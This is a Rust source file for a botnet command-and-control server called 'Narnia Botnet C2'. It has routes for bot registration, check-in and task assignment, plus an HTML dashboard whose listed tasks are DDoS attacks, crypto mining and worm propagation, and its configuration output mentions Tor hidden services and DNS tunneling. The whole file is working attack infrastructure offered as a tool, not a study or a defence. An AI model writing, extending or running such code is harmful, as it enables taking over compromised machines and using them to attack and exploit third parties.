// c2/src/main.rs
#[macro_use] extern crate rocket;

use rocket::serde::{Deserialize, Serialize, json::Json};
use rocket::State;
use std::sync::Mutex;
use std::collections::HashMap;
use rusqlite::{Connection, Result as SqlResult};
use chrono::{DateTime, Utc};
use std::net::TcpListener;
use std::io::{Read, Write};
use std::thread;
use std::sync::Arc;

mod config;
use config::C2Config;

#[derive(Serialize, Deserialize)]
struct BotInfo {
    id: String,
    ip: String,
    os: String,
    last_seen: DateTime<Utc>,
    status: String,
}

#[derive(Serialize, Deserialize)]
struct Task {
    id: String,
    bot_id: String,
    task_type: String,
    params: String,
    status: String,
    created_at: DateTime<Utc>,
}

struct BotnetState {
    db: Mutex<Connection>,
}

impl BotnetState {
    fn new() -> Self {
        let conn = Connection::open("botnet.db").unwrap();
        conn.execute(
            "CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                ip TEXT,
                os TEXT,
                last_seen TEXT,
                status TEXT
            )",
            [],
        ).unwrap();
        conn.execute(
            "CREATE TABLE IF NOT EXISTS tasks (
                id TEXT PRIMARY KEY,
                bot_id TEXT,
                task_type TEXT,
                params TEXT,
                status TEXT,
                created_at TEXT
            )",
            [],
        ).unwrap();
        Self {
            db: Mutex::new(conn),
        }
    }
}

#[post("/register", data = "<bot_info>")]
fn register_bot(bot_info: Json<BotInfo>, state: &State<BotnetState>) -> String {
    let conn = state.db.lock().unwrap();
    conn.execute(
        "INSERT OR REPLACE INTO bots (id, ip, os, last_seen, status) VALUES (?1, ?2, ?3, ?4, ?5)",
        [&bot_info.id, &bot_info.ip, &bot_info.os, &bot_info.last_seen.to_string(), &bot_info.status],
    ).unwrap();
    "registered".to_string()
}

#[get("/checkin/<id>")]
fn checkin(id: String, state: &State<BotnetState>) -> Json<Task> {
    let conn = state.db.lock().unwrap();
    // Update last_seen
    let now = Utc::now();
    conn.execute(
        "UPDATE bots SET last_seen = ?1 WHERE id = ?2",
        [&now.to_string(), &id],
    ).unwrap();

    // Get pending task
    let mut stmt = conn.prepare("SELECT id, bot_id, task_type, params, status, created_at FROM tasks WHERE bot_id = ?1 AND status = 'pending' LIMIT 1").unwrap();
    let task_iter = stmt.query_map([&id], |row| {
        Ok(Task {
            id: row.get(0)?,
            bot_id: row.get(1)?,
            task_type: row.get(2)?,
            params: row.get(3)?,
            status: row.get(4)?,
            created_at: DateTime::parse_from_rfc3339(&row.get::<_, String>(5)?).unwrap().with_timezone(&Utc),
        })
    }).unwrap();

    for task in task_iter {
        let mut t = task.unwrap();
        // Mark as in_progress
        conn.execute("UPDATE tasks SET status = 'in_progress' WHERE id = ?1", [&t.id]).unwrap();
        t.status = "in_progress".to_string();
        return Json(t);
    }

    // No task, return sleep
    Json(Task {
        id: "".to_string(),
        bot_id: id,
        task_type: "sleep".to_string(),
        params: "".to_string(),
        status: "none".to_string(),
        created_at: now,
    })
}

#[post("/task", data = "<task>")]
fn assign_task(task: Json<Task>, state: &State<BotnetState>) -> String {
    let conn = state.db.lock().unwrap();
    let task_id = format!("task_{}", Utc::now().timestamp());
    conn.execute(
        "INSERT INTO tasks (id, bot_id, task_type, params, status, created_at) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
        [&task_id, &task.bot_id, &task.task_type, &task.params, "pending", &Utc::now().to_string()],
    ).unwrap();
    task_id
}

#[get("/bots")]
fn get_bots(state: &State<BotnetState>) -> Json<Vec<BotInfo>> {
    let conn = state.db.lock().unwrap();
    let mut stmt = conn.prepare("SELECT id, ip, os, last_seen, status FROM bots").unwrap();
    let bot_iter = stmt.query_map([], |row| {
        Ok(BotInfo {
            id: row.get(0)?,
            ip: row.get(1)?,
            os: row.get(2)?,
            last_seen: DateTime::parse_from_rfc3339(&row.get::<_, String>(3)?).unwrap().with_timezone(&Utc),
            status: row.get(4)?,
        })
    }).unwrap();

    let mut bots = Vec::new();
    for bot in bot_iter {
        bots.push(bot.unwrap());
    }
    Json(bots)
}

#[get("/tasks")]
fn get_tasks(state: &State<BotnetState>) -> Json<Vec<Task>> {
    let conn = state.db.lock().unwrap();
    let mut stmt = conn.prepare("SELECT id, bot_id, task_type, params, status, created_at FROM tasks").unwrap();
    let task_iter = stmt.query_map([], |row| {
        Ok(Task {
            id: row.get(0)?,
            bot_id: row.get(1)?,
            task_type: row.get(2)?,
            params: row.get(3)?,
            status: row.get(4)?,
            created_at: DateTime::parse_from_rfc3339(&row.get::<_, String>(5)?).unwrap().with_timezone(&Utc),
        })
    }).unwrap();

    let mut tasks = Vec::new();
    for task in task_iter {
        tasks.push(task.unwrap());
    }
    Json(tasks)
}

#[get("/")]
fn dashboard() -> &'static str {
    r#"
    <!DOCTYPE html>
    <html>
    <head>
        <title>Narnia Botnet C2</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            .section { margin: 20px 0; padding: 20px; border: 1px solid #ccc; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
            button { padding: 10px 20px; margin: 5px; }
        </style>
    </head>
    <body>
        <h1>Narnia Botnet Command & Control</h1>

        <div class="section">
            <h2>Bot Management</h2>
            <button onclick="loadBots()">Refresh Bots</button>
            <div id="bots"></div>
        </div>

        <div class="section">
            <h2>Task Assignment</h2>
            <form id="taskForm">
                <select id="botSelect"></select>
                <select id="taskType">
                    <option value="ddos">DDoS Attack</option>
                    <option value="mine">Crypto Mining</option>
                    <option value="spread">Worm Propagation</option>
                </select>
                <input type="text" id="params" placeholder="Parameters">
                <button type="submit">Assign Task</button>
            </form>
        </div>

        <div class="section">
            <h2>Active Tasks</h2>
            <button onclick="loadTasks()">Refresh Tasks</button>
            <div id="tasks"></div>
        </div>

        <script>
            async function loadBots() {
                const response = await fetch('/bots');
                const bots = await response.json();
                const html = `
                    <table>
                        <tr><th>ID</th><th>IP</th><th>OS</th><th>Last Seen</th><th>Status</th></tr>
                        ${bots.map(bot => `
                            <tr>
                                <td>${bot.id}</td>
                                <td>${bot.ip}</td>
                                <td>${bot.os}</td>
                                <td>${bot.last_seen}</td>
                                <td>${bot.status}</td>
                            </tr>
                        `).join('')}
                    </table>
                `;
                document.getElementById('bots').innerHTML = html;
                updateBotSelect(bots);
            }

            function updateBotSelect(bots) {
                const select = document.getElementById('botSelect');
                select.innerHTML = bots.map(bot => `<option value="${bot.id}">${bot.id}</option>`).join('');
            }

            async function loadTasks() {
                const response = await fetch('/tasks');
                const tasks = await response.json();
                const html = `
                    <table>
                        <tr><th>ID</th><th>Bot ID</th><th>Type</th><th>Params</th><th>Status</th><th>Created</th></tr>
                        ${tasks.map(task => `
                            <tr>
                                <td>${task.id}</td>
                                <td>${task.bot_id}</td>
                                <td>${task.task_type}</td>
                                <td>${task.params}</td>
                                <td>${task.status}</td>
                                <td>${task.created_at}</td>
                            </tr>
                        `).join('')}
                    </table>
                `;
                document.getElementById('tasks').innerHTML = html;
            }

            document.getElementById('taskForm').addEventListener('submit', async (e) => {
                e.preventDefault();
                const botId = document.getElementById('botSelect').value;
                const taskType = document.getElementById('taskType').value;
                const params = document.getElementById('params').value;

                await fetch('/task', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bot_id: botId, task_type: taskType, params })
                });

                loadTasks();
            });

            loadBots();
            loadTasks();
        </script>
    </body>
    </html>
    "#
}

#[launch]
fn rocket() -> _ {
    // Load configuration
    let config = match C2Config::load() {
        Ok(cfg) => {
            if let Err(e) = cfg.validate() {
                eprintln!("Configuration validation failed: {}", e);
                std::process::exit(1);
            }
            println!("Configuration loaded successfully");
            println!("Server will listen on: {}", cfg.get_server_address());
            if cfg.is_tor_enabled() {
                println!("Tor hidden service: Enabled");
            }
            if cfg.is_dns_enabled() {
                println!("DNS tunneling: Enabled");
            }
            cfg
        }
        Err(e) => {
            eprintln!("Failed to load configuration: {}", e);
            eprintln!("Using default configuration...");
            C2Config::default()
        }
    };

    rocket::build()
        .manage(BotnetState::new())
        .manage(config)
        .mount("/", routes![dashboard, register_bot, checkin, assign_task, get_bots, get_tasks])
}
